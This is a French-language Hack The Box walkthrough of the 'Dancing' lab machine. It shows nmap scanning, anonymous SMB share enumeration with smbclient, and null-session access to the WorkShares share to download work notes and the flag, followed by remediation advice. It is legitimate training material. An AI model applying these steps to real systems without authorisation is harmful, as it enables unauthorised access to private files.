# HTB — Dancing (Starting Point)

**Difficulté :** Very Easy
**OS :** Windows
**Catégorie :** Starting Point

## Résumé

Dancing est une machine d'introduction axée sur l'énumération et l'exploitation d'un partage **SMB** mal configuré, autorisant une connexion sans authentification valide (null session) et exposant des fichiers sensibles, dont le flag.

## 1. Connexion au VPN

Connexion au lab HTB via OpenVPN (pool *Starting Point*), puis vérification de la connectivité :

```bash
ping -c 5 10.129.27.136
```

## 2. Reconnaissance / Scan de ports

```bash
sudo nmap -sV 10.129.27.136
```

Résultat :

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows
```

Le port **445/tcp (SMB)** est ouvert, accompagné de **135** (RPC) et **139** (NetBIOS), typique d'une machine Windows. Le port 5985 indique également WinRM.

## 3. Énumération des partages SMB

Installation du client si nécessaire (macOS) :

```bash
brew install samba
```

Listage des partages disponibles sans fournir de mot de passe (authentification nulle) :

```bash
smbclient -L 10.129.27.136
```

(Appuyer sur Entrée à la demande de mot de passe.)

Partages identifiés :

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

## 4. Foothold — accès au partage WorkShares

Tentative de connexion aux partages `ADMIN$` et `C$` : refusée (`NT_STATUS_ACCESS_DENIED`), comme attendu pour des partages administratifs.

Le partage personnalisé `WorkShares`, en revanche, accepte une connexion sans identifiants valides :

```bash
smbclient \\\\10.129.27.136\\WorkShares
```

(Entrée pour le mot de passe.)

Accès obtenu, confirmé par le changement de prompt :

```
smb: \>
```

## 5. Navigation et récupération du flag

Listage du contenu :

```
smb: \> ls
Amy.J
James.P
```

Navigation dans chaque répertoire et téléchargement des fichiers trouvés :

```
smb: \> cd Amy.J
smb: \Amy.J\> ls
worknotes.txt
smb: \Amy.J\> get worknotes.txt

smb: \Amy.J\> cd ..
smb: \> cd James.P
smb: \James.P\> ls
flag.txt
smb: \James.P\> get flag.txt
smb: \James.P\> exit
```

Lecture du flag en local :

```bash
cat flag.txt
```

## Conclusion

Cette machine illustre une mauvaise configuration fréquente en environnement Active Directory/Windows : un partage SMB personnalisé laissé accessible sans authentification, exposant des fichiers internes (notes de travail, identifiants potentiels) aux attaquants. La remédiation consiste à restreindre l'accès au partage via des ACL appropriées et à désactiver les connexions anonymes/null session sur le serveur SMB.

## Résumé des commandes

| Étape | Commande |
|---|---|
| Scan de ports/versions | `sudo nmap -sV <IP>` |
| Lister les partages SMB | `smbclient -L <IP>` |
| Se connecter à un partage | `smbclient \\\\<IP>\\<Partage>` |
| Lister les fichiers | `ls` |
| Changer de répertoire | `cd <dossier>` |
| Télécharger un fichier | `get <fichier>` |
| Quitter la session | `exit` |
